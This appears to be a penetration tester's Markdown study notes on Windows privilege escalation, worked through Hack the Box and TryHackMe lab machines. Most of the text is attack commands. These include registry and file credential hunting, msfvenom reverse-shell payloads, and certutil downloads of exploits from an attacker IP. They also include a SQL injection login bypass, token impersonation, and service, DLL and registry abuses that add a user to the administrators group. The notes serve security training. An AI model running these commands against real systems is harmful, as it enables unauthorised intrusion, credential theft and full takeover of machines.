# Windows Privilege Escalation

Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html

PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

Sushant 747's Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

## Gaining a Foothold

Hack the Box: Devel

msfvenom: https://netsec.ws/?p=331

## Initial Enumeration

Hack the Box: Devel

### System Enumeration

```
systeminfo
systeminfo | findstr /B /C: "OS Name" /C:"OS Version" /C:"System Type"
```
```
hostname
```
```
wmic wfe
wmic wfe get Caption,Description,HotFixID,InstalledOn
```
```
wmic logicaldisk get caption,description,providername
```

### User Enumeration

```
whoami
whoami /priv
whoami /groups
```
```
net user
net user hunter
net user administrator
net localgroup
net localgroup administrators
```

### Network Enumeration

```
ipconfig
ipconfig /all
```
```
arp -a
arp -all
```
```
route print
```
```
netstat -ano
```

### Password Hunting

Search for them:

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

In Files:

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

In Registry:

```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### AV Enumeration

```
query windefend
```
```
sc queryex type= service
```
```
net advfirewall firewall dump
```
```
firewall show state
```
```
netsh fireall show config
```

## Exploring Automated Tools

Hack the Box: Devel

winpeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

Windows Priv Esc Checklist: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

Sherlock: https://github.com/rasta-mouse/Sherlock

Watson: https://github.com/rasta-mouse/Watson

PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

JAWS: https://github.com/411Hall/JAWS

Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

Metasploit Local Exploit Suggester: https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/

Seatbelt: https://github.com/GhostPack/Seatbelt

SharpUp: https://github.com/GhostPack/SharpUp

---

Upload WinPEAS to Windows Machine

```
cd c:\\windows\\temp
upload /root/tranfers/winPEAS.exe
shell
```

```
winPEAS.exe
```

Run PowerShell on Windows machine

```
powershell -ep bypass
```

Load PowerShell via MetaSploit

```
load powershell
```

Meterpreter Exploit Suggester

```
run post/multi/recon/local_exploit_suggester
```

Windows Exploit Suggester Python

```
./windows-exploit-suggester.py --update
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
pip install xlrd --upgrade
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt
```

## Escalation Path: Kernel Exploits

Hack the Box: Devel

Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits

### Escalation with Metasploit

Kitrap0d Info: https://seclists.org/fulldisclosure/2010/Jan/341

```
use exploit/windows/local/ms10_015_kitrap0d
options
set session 9
set LHOST tun0
set LPORT 5555
run
getuid
shell
```

### Manual Kernel Exploitation

MS10-059: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f -aspx > manual.aspx 
nc -nvlp 4444
```
```
ftp 10.10.10.5
put manual.aspx
```
```
python3 -m http.server 80
```
```
cd temp
certutil -urlcache -f hxxp://10.10.14.5/MS10-059.exe ms.exe
ms.exe 10.10.14.5 5555
```

## Escalation Path: Passwords and Port Forwarding

Hack the Box: ChatterBox

Achat Exploit: https://www.exploit-db.com/exploits/36025

Achat Exploit (Metasploit): https://www.rapid7.com/db/modules/exploit/windows/misc/achat_bof

### Gaining Foothold 

```
searchsploit achat
searchsploit -m 36025.py
```

### Escalation via Stored Passwords

Plink Download: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

```
sysinfo
net user alfred
ipconfig
netstat -ano
```
```
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

Plink 

```
python3 -m http.server 80
```
```
certutil -urlcache -f hxxp://10.10.14.5/plink.exe
```
```
sudo apt install ssh
gedit /etc/ssh/sshd_config
(Uncomment PermitRootLogin and change the value to yes)
service ssh restart
service ssh start
```
```
plink.exe -l root -pw toor -R 445:127.0.01:445 10.10.14.5
netstat -ano | grep 445
```
```
winexe -U Administrator%Welcome1! //127..0.0.1 "cmd.exe"
```

## Escalation Path: Windows Subsystem for Linux

Hack the Box: SecNotes

### Gaining a Foothold

SQL Injection on the Register Login page

```
' OR 1 OR '
```

Login with the SQL Injection

Try PsExec

```
psexec.py tyler:'password'@10.10.10.97
```

Try New Site SMB

```
smbclient \\\\10.10.10.97\new-site -U tyler
put nc.exe
put rev.php (php reverse shell)
```

On Kali Box

```
locate nc.exe
cp <path to nc.exe> nc.exe
nc -nvlp 4444
```

Go to web page, hxxp://10.10.10.97/rev.php to execute revshell.

### Escalation via WSL

Spawning TTY Shell: https://netsec.ws/?p=337

Impacket Toolkit: https://github.com/SecureAuthCorp/impacket

```
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
<path_to_bash.exe>
python -c "import pty;pty.spawn('/bin/bash')"
history (shows admin password)
```

```
psexec.py administrator:'password'@10.10.10.97 (doesnt work)
smbexec.py administrator:'password'@10.10.10.97
```

## Impersonation and Potato Attacks

### Token Impersonation

Two Types:
- Delegate
- Impersonate

### Impersonation Privileges

```
whoami /priv (look for SeImpersonatePrivelege)
```

- SeAssignPrimaryToken - look for this one for potato attack
- SeBackup
- SeCreateToken
- SeDebug
- SeTakeOwnership

### Potato Attacks

Rotten Potato: https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

Juicy Potato: https://github.com/ohpe/juicy-potato

### Gaining Foothold

Hack the Box: Jeeves

Groovy Reverse Shell: https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

- Navigate to HTTP port 80 and 50000
- Run Directory Enum against 50000
- Navigate to askjeeves directory, and then to script console. It runs groovy.
- Run Groovy Reverese Shell

### Escalation via Potato Attack

```
msfconsole
use exploit/multi/script/web_delivery
options
show targets
set target 2 (PSH)
set payload windows/meterpreter/reverse_tcp
set lhost
set srvhost
run
(copy shell and put into victim machine)
getuid
getprivs
run post/multi/recon/local_exploit_suggester
background
use windows/local/ms16_075_reflection
options
(make sure all settings are the same, and LPORT changed, and payload to windows/x4/meterpreter/reverse_tcp)
run
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
shell
whoami
type hm.txt
```

### Alternate Data Streams

Alternative Data Streams: https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/

```
dir /R
more < hm.txt.root.txt:$DATA
```

## Escalation Path: getsystem

getsystem Explained: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

Meterpreter Shell

```
getsystem
getsystem -h
```

## Escalation Path: RunAs

Microsoft Documentation: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)

### Gaining a Foothold

Hack the Box: Access

- Navigate to HTTP port 80
- Check FTP Anonymous Login (ls, cd backups, get backup.mdb, cd engineer, get "access control.zip")
- Explore what you grabbed
- Use mdb-sql to read/open those files
- Enumerate tables (auth_user)
- unzip Access Control file and read email (find creds)
- telnet into machine with found creds

### Escalation via RunAs

```
cmdkey /list
```
```
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users
Administrator\Desktop\root.txt > C:\Users\security\root.txt"
```

## Additional Labs

TryHackMe - https://tryhackme.com/

Windows PrivEsc Lab - https://tryhackme.com/room/windowsprivescarena

## Escalation Path: Registry

### Autoruns

Autoruns

```
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.ex
```

Accesscheck

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```

PowerUp

```
powershell -ep bypasss
.\PowerUp.ps1
Invoke-AllChecks
```

### Escalation via Autoruns

Kali

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Kali VM IP Address]
run
```
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
```
- Copy the generated file, program.exe, to the Windows VM.

Windows

- Place program.exe in 'C:\Program Files\Autorun Program'.
- To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

Kali

- Wait for a new session to open in Metasploit.

```
sessions -i [Session ID]
getuid
```

### AlwaysInstallElevated

Windows

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
- From the output, notice that “AlwaysInstallElevated” value is 1.

```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
- From the output, notice that “AlwaysInstallElevated” value is 1.

Kali

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Kali VM IP Address]
run
```

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
```

- Copy the generated file, setup.msi, to the Windows VM.

Windows VM

- Place 'setup.msi' in 'C:\Temp'.

```
msiexec /quiet /qn /i C:\Temp\setup.msi
```

### regsvc ACL / Escalation

Detection

Windows

PowerShell prompt:

```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

- Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

Exploitation

Windows VM

- Copy 'C:\Users\User\Desktop\Tools\Source\windows_service.c' to the Kali VM.

```
python -m pyftplib -p 21 --write
```

Kali VM

```
ftp 10.11.4.114 (anonymous login)
put windows_service.c
```

- Open windows_service.c in a text editor and replace the command used by the system() function to: 

```
cmd.exe /k net localgroup administrators user /add
```

- Exit the text editor and compile the file by typing the following in the command prompt:

```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')
```

- Copy the generated file x.exe, to the Windows VM.

Windows VM

- Place x.exe in 'C:\Temp'.

- Open command prompt at type:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
```
sc start regsvc
```

- It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt:
```
net localgroup administrators
```

## Escalation Path: Executable Files

Detection

Windows

PowerUp

```
powershell -ep bypass
..\PowerUp.ps1
Invoke-AllChecks
```

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```

- Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

Exploitation

Windows VM

```
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```
```
sc start filepermsvc
net localgroup administrators
```

## Escalation Path: Startup Applications

icacls Docs: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls

Detection

Windows VM

```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

- From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.

### Escalation via Startup Applications

Exploitation

Kali VM

```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Kali VM IP Address]
run
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o y.exe
```

- Copy the generated file, y.exe, to the Windows VM.

Windows VM

- Place y.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
- Logoff.
- Login with the administrator account credentials.

Kali VM

- Wait for a session to be created, it may take a few seconds.
- In Meterpreter(meterpreter > prompt) type: getuid
- From the output, notice the user is “User-PC\Admin”

## Escalation Path: DLL Hijacking

Detection

Windows VM

- Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
- In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
- In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.
- In the input box on the same line type: dllhijackservice.exe
- Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
- Next, select from the left-most drop down menu ‘Result’.
- In the input box on the same line type: NAME NOT FOUND
- Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
- Open command prompt and type: 
```
sc start dllsvc
```
- Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.

Exploitation

Windows VM

- Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.

```
ftp 10.11.4.14
(anonymous login)
put windows_dll.c
```

Kali VM

```
python -m pyftpdlib -p 21 --write
```

- Open windows_dll.c in a text editor (gedit) and replace the command used by the system() function to:

```
cmd.exe /k net localgroup administrators user /add
```

Command prompt:

```
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

- Copy the generated file hijackme.dll, to the Windows VM.

```
python3 -m http.server 80
```

Windows VM

- Place hijackme.dll in ‘C:\Temp’.

Command prompt:
```
sc stop dllsvc & sc start dllsvc
net localgroup administrators
```

## Escalation Path: Service Permissions (Paths)

### Escalation via Binary Paths

Detection

Windows VM

- Open command prompt and type: 

```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
```

- Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.

Exploitation

Windows VM

- In command prompt type: 

```
sc config daclsvc binpath= "net localgroup administrators user /add"
sc start daclsvc
net localgroup administrators
```

### Escalation via Unquoted Service Paths

Detection

Windows VM

Open command prompt and type: 

```
sc qc unquotedsvc
```

- Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.

Exploitation

Kali VM

- Open command prompt and type: 

```msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```

- Copy the generated file, common.exe, to the Windows VM.

Windows VM

- Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
- Open command prompt and type: 

```
sc start unquotedsvc
net localgroup administrators
```

For additional practice, it is recommended to attempt the TryHackMe room Steel Mountain (https://tryhackme.com/room/steelmountain).

### Gaining a Foothold

### Escalation via Unquoted Service Paths Metasploit

### Manual Challenge

## Escalation Path: CVE-2019-1388

ZeroDayInitiative CVE-2019-1388: https://www.youtube.com/watch?v=3BQKpPNlTSo

### Gaining a Foothold

### Escalation via CVE-2019-1388

Rapid7 CVE-2019-1388: https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388

## Capstone Challenge

- [Basic Powershell for Pentesters](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)
- [Mounting VHD Files](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)
- [Capturing MSSQL Creds:](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)
